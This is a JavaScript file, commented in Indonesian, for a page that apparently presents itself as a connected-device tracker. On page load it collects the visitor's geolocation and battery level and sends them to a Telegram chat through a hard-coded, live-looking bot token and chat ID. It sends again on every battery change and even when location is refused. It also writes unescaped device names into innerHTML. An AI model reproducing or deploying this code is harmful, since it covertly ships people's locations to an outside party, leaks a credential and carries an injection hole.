document.addEventListener('DOMContentLoaded', function () {
    const botToken = '7613841593:AAH-uvuKnVfb9Pl1Ah02g6rRYA_ebAQZr_o'; // Ganti dengan token bot Telegram Anda
    const chatId = '-1002670609388'; // Ganti dengan chat ID Anda di Telegram
    const deviceIdInput = document.getElementById('device-id-input'); // Input field untuk ID perangkat
    const addDeviceButton = document.getElementById('add-device'); // Tombol tambahkan perangkat
    const connectedDevicesElement = document.getElementById('connected-devices'); // Elemen untuk menampilkan perangkat terhubung

    // Data perangkat utama
    let deviceData = {
        name: 'Perangkat Saya',
        battery: null,
        location: null,
        id: localStorage.getItem('deviceId') || generateUniqueId()
    };
    localStorage.setItem('deviceId', deviceData.id); // Simpan ID perangkat ke localStorage

    // Daftar perangkat yang terhubung
    let connectedDevices = JSON.parse(localStorage.getItem('connectedDevices')) || [];

    // Fungsi untuk menghasilkan ID unik
    function generateUniqueId() {
        return Date.now().toString(36) + Math.random().toString(36).substr(2);
    }

    // Fungsi untuk mengirim data ke bot Telegram
    function sendDataToBot(data) {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const payload = {
            chat_id: chatId,
            text: JSON.stringify(data) // Kirim data dalam format JSON
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(result => {
            console.log('Data sent to Telegram bot:', result);
        })
        .catch(error => {
            console.error('Error sending data to Telegram bot:', error);
        });
    }

    // Fungsi untuk meminta izin lokasi dan mengirim data ke bot
    function requestLocationAndSendData() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    // Jika lokasi berhasil didapatkan
                    deviceData.location = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude
                    };
                    updateDeviceInfo(); // Update tampilan informasi perangkat
                    sendDataToBot(deviceData); // Kirim data ke bot Telegram
                },
                (error) => {
                    // Jika gagal mendapatkan lokasi
                    console.error('Error getting location:', error);
                    alert('Tidak dapat mendapatkan lokasi. Pastikan izin lokasi diberikan.');
                    deviceData.location = null; // Set lokasi ke null
                    updateDeviceInfo(); // Update tampilan informasi perangkat
                    sendDataToBot(deviceData); // Kirim data ke bot Telegram meskipun lokasi null
                }
            );
        } else {
            // Jika browser tidak mendukung Geolocation API
            console.error('Geolocation is not supported by this browser.');
            alert('Browser Anda tidak mendukung fitur lokasi.');
            deviceData.location = null; // Set lokasi ke null
            updateDeviceInfo(); // Update tampilan informasi perangkat
            sendDataToBot(deviceData); // Kirim data ke bot Telegram meskipun lokasi null
        }
    }

    // Fungsi untuk mengupdate informasi perangkat di website
    function updateDeviceInfo() {
        const deviceNameElement = document.getElementById('device-name');
        const deviceBatteryElement = document.getElementById('device-battery');
        const deviceLocationElement = document.getElementById('device-location');
        const deviceIdElement = document.getElementById('device-id');

        if (deviceNameElement) deviceNameElement.textContent = deviceData.name;
        if (deviceBatteryElement) deviceBatteryElement.textContent = deviceData.battery || 'Tidak tersedia';
        if (deviceLocationElement) {
            deviceLocationElement.textContent = deviceData.location ?
                `${deviceData.location.lat.toFixed(4)}, ${deviceData.location.lng.toFixed(4)}` :
                'Tidak tersedia';
        }
        if (deviceIdElement) deviceIdElement.textContent = deviceData.id;
    }

    // Fungsi untuk mengambil data perangkat dari file JSON
    async function fetchDeviceData() {
        try {
            const response = await fetch('deviceData.json'); // Ambil data dari file JSON
            const data = await response.json();
            return data;
        } catch (error) {
            console.error('Error fetching device data:', error);
            return [];
        }
    }

    // Fungsi untuk menambahkan perangkat
    async function addDevice(deviceId) {
        const deviceDataList = await fetchDeviceData(); // Ambil data dari file JSON
        const device = deviceDataList.find(device => device.id === deviceId); // Cari perangkat berdasarkan ID

        if (device) {
            // Periksa apakah perangkat sudah ada di daftar terhubung
            const existingDeviceIndex = connectedDevices.findIndex(d => d.id === deviceId);
            if (existingDeviceIndex === -1) {
                connectedDevices.push(device); // Tambahkan perangkat baru
            } else {
                connectedDevices[existingDeviceIndex] = device; // Update perangkat yang sudah ada
            }

            localStorage.setItem('connectedDevices', JSON.stringify(connectedDevices)); // Simpan ke localStorage
            renderConnectedDevices(); // Render ulang daftar perangkat
            alert(`Perangkat "${device.name}" berhasil ditambahkan/diperbarui.`);
        } else {
            alert('Perangkat tidak ditemukan. Pastikan ID perangkat benar.');
        }
    }

    // Fungsi untuk merender daftar perangkat terhubung
    function renderConnectedDevices() {
        connectedDevicesElement.innerHTML = '<h2>Perangkat Terhubung</h2>';
        if (connectedDevices.length === 0) {
            connectedDevicesElement.innerHTML += '<p>Tidak ada perangkat terhubung.</p>';
            return;
        }

        connectedDevices.forEach(device => {
            const deviceElement = document.createElement('div');
            deviceElement.className = 'connected-device';
            deviceElement.innerHTML = `
                <h3>${device.name}</h3>
                <p>Baterai: ${device.battery || 'Tidak tersedia'}</p>
                <p>Lokasi: ${device.location ? `${device.location.lat.toFixed(4)}, ${device.location.lng.toFixed(4)}` : 'Tidak tersedia'}</p>
                <p>ID Perangkat: ${device.id}</p>
            `;
            connectedDevicesElement.appendChild(deviceElement);
        });
    }

    // Event listener untuk tombol tambahkan perangkat
    addDeviceButton.addEventListener('click', function () {
        const deviceId = deviceIdInput.value.trim();
        if (deviceId) {
            addDevice(deviceId); // Tambahkan perangkat
        } else {
            alert('Masukkan ID perangkat yang valid.');
        }
    });

    // Ambil informasi baterai perangkat utama
    if ('getBattery' in navigator) {
        navigator.getBattery().then((battery) => {
            deviceData.battery = `${Math.round(battery.level * 100)}%`;
            updateDeviceInfo(); // Update tampilan informasi perangkat
            sendDataToBot(deviceData); // Kirim data ke bot setelah informasi baterai didapatkan

            // Update informasi baterai jika ada perubahan
            battery.addEventListener('levelchange', () => {
                deviceData.battery = `${Math.round(battery.level * 100)}%`;
                updateDeviceInfo(); // Update tampilan informasi perangkat
                sendDataToBot(deviceData); // Kirim data ke bot setiap kali baterai berubah
            });
        });
    } else {
        console.error('Battery Status API is not supported by this browser.');
        deviceData.battery = 'Tidak tersedia';
        updateDeviceInfo(); // Update tampilan informasi perangkat
        sendDataToBot(deviceData); // Kirim data ke bot meskipun informasi baterai tidak tersedia
    }

    // Minta izin lokasi dan kirim data ke bot
    requestLocationAndSendData();

    // Render daftar perangkat terhubung saat halaman dimuat
    renderConnectedDevices();
});
